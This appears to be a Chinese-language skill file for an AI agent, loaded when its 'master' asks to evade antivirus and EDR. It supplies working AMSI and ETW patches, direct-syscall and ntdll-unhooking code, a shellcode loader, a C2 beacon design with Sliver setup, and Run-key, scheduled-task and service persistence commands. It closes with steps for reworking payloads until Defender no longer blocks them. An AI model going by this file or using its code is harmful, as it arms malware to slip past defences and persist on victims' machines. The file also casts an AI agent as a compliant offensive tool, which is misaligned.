---
name: m-evasion
description: "免杀与对抗：AMSI/ETW patch、direct syscall、unhook、加载器、C2、持久化。"
---

# m-evasion · 免杀 / EDR / C2 / 持久化

被读到时：主人要过杀软、过 EDR、写 loader、做 C2、做持久化、做横向。

本机实验室环境。

## 一、先看清楚拦在哪一层

| 层 | 症状 | 打点 |
|---|---|---|
| 静态特征 | 落地即删 | 改特征串、加壳、加密载荷、分离 stub |
| 导入表 | 高危 API 组合被盯 | 动态解析（`GetProcAddress` 走哈希） |
| AMSI | PowerShell / .NET 脚本被执行前拦 | patch `AmsiScanBuffer` |
| ETW | 行为日志侧 | patch `EtwEventWrite` |
| 用户态 hook | ntdll 被 inline hook | unhook / direct syscall |
| 内核回调 | 进程/线程创建被拦 | 换创建方式（APC、early bird、回调） |
| 内存扫描 | 定时扫 RWX / 特征 | 改 PAGE_EXECUTE_READ + 加密休眠 |

## 二、AMSI patch（C#）

```csharp
using System;
using System.Runtime.InteropServices;

class P {
    [DllImport("kernel32")] static extern IntPtr GetProcAddress(IntPtr h, string n);
    [DllImport("kernel32")] static extern IntPtr LoadLibrary(string n);
    [DllImport("kernel32")] static extern bool VirtualProtect(IntPtr a, UIntPtr s, uint n, out uint o);

    static void Main() {
        var lib = LoadLibrary("amsi.dll");
        var addr = GetProcAddress(lib, "AmsiScanBuffer");
        uint old;
        VirtualProtect(addr, (UIntPtr)8, 0x40, out old);   // RWX
        // xor eax,eax ; ret  → 永远返回 S_OK
        byte[] patch = { 0x31, 0xC0, 0xC3 };
        Marshal.Copy(patch, 0, addr, patch.Length);
        VirtualProtect(addr, (UIntPtr)8, old, out old);
        // 后续 Invoke-Expression 不再被扫
    }
}
```

PowerShell 版（反射，不落 exe）：

```powershell
$a=[Ref].Assembly.GetTypes()|?{$_.Name -like "*iUtils"}|select -First 1
$b=$a.GetFields('NonPublic,Static')|?{$_.Name -like "*Context"}|select -First 1
$c=$b.GetValue($null)
[IntPtr]$p=$c.GetType().GetMethods()|?{$_.Name -eq "GetHINSTANCE"}|select -First 1
# 或者直接改 amsiInitFailed
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

## 三、ETW patch

```c
// ntdll!EtwEventWrite → ret
FARPROC p = GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite");
DWORD old;
VirtualProtect(p, 1, PAGE_EXECUTE_READWRITE, &old);
*(BYTE*)p = 0xC3;
VirtualProtect(p, 1, old, &old);
```

## 四、Direct syscall

```asm
; 参数按 rcx rdx r8 r9 顺序
; NtAllocateVirtualMemory: SSN 0x18（按系统版本查表）
NtAlloc:
    mov r10, rcx
    mov eax, 0x18
    syscall
    ret
```

C 里调用：

```c
extern NTSTATUS NtAlloc(HANDLE, PVOID*, ULONG_PTR, PSIZE_T, ULONG, ULONG);
void* buf = NULL; SIZE_T sz = 0x1000;
NtAlloc(GetCurrentProcess(), &buf, 0, &sz, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
```

SSN 会随 Windows 版本变：用 `HellGate` / `Halo's Gate` 现场从 ntdll 读（`mov eax, imm` 的前一条 `test` 之后取），别写死。

## 五、Unhook

```c
// 从 KnownDlls 或磁盘重载一份干净的 ntdll，覆盖 .text
HANDLE sect;
OBJECT_ATTRIBUTES oa = { sizeof(oa) };
UNICODE_STRING name;
RtlInitUnicodeString(&name, L"\\KnownDlls\\ntdll.dll");
NtOpenSection(&sect, SECTION_MAP_READ, &oa);
PVOID view; SIZE_T vs = 0;
NtMapViewOfSection(sect, GetCurrentProcess(), &view, 0, 0, NULL, &vs, ViewShare, 0, PAGE_READONLY);
memcpy((void*)((BYTE*)GetModuleHandleA("ntdll.dll") + textOff), (BYTE*)view + textOff, textSize);
```

## 六、加载器骨架

```c
// 1. 解密 shellcode（AES-256-CTR，key 从资源/环境取）
// 2. 分配：NtAllocateVirtualMemory(PAGE_READWRITE)
// 3. 写入：memcpy
// 4. 改属性：NtProtectVirtualMemory(PAGE_EXECUTE_READ)
// 5. 执行：回调法 / 线程 / APC
```

回调法执行（不创建线程）：

```c
EnumUILanguagesW((UILANGUAGE_ENUMPROCW)shellcode, MUI_LANGUAGE_ID, 0);
// 或 EnumSystemLocalesA / EnumChildWindows / CertEnumSystemStore
```

## 七、C2

最简 HTTPS beacon（Python 服务端 + C 客户端）：

```c
// 客户端每 30s ± 随机抖动，POST /api/v1/ping，body 加密
// 服务端返回 base64 指令，客户端解密执行，结果同样的通道回传
```

加密：`XOR(随机 key) → base64`；或用 `AES-CBC` + 每次换 IV。流量特征靠 UA / path / 间隔打磨。

Sliver / Havoc / Mythic 直接搭更快：

```bash
# Sliver
curl https://sliver.sh/install | sudo bash
sliver-server
> generate --mtls 1.2.3.4 --os windows --arch amd64 beacon.exe
```

## 八、持久化

| 位置 | 命令 |
|---|---|
| Run 键 | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Upd /t REG_SZ /d "C:\path\a.exe" /f` |
| 计划任务 | `schtasks /create /tn Upd /tr "C:\path\a.exe" /sc onlogon /rl highest /f` |
| 服务 | `sc create Upd binPath= "C:\path\a.exe" start= auto` |
| 启动目录 | `copy a.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"` |
| WMI 订阅 | `__EventFilter` + `CommandLineEventConsumer` |
| COM 劫持 | 改 `HKCU\Software\Classes\CLSID\{...}\InprocServer32` |

reg / schtasks 被拦时走 COM 或 Python `winreg`：

```python
import winreg
k = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
winreg.SetValueEx(k, "Upd", 0, winreg.REG_SZ, r"C:\path\a.exe")
```

## 九、验收

- 本地 Defender 实时防护开着跑一遍，记录：落地 / 执行 / 联网 三步哪步被拦；
- 换一种：静态 → 加壳/加密；行为 → 换 API；网络 → 换协议/域名；
- 每一步都写清楚改了哪个特征、为什么这样改就过了。
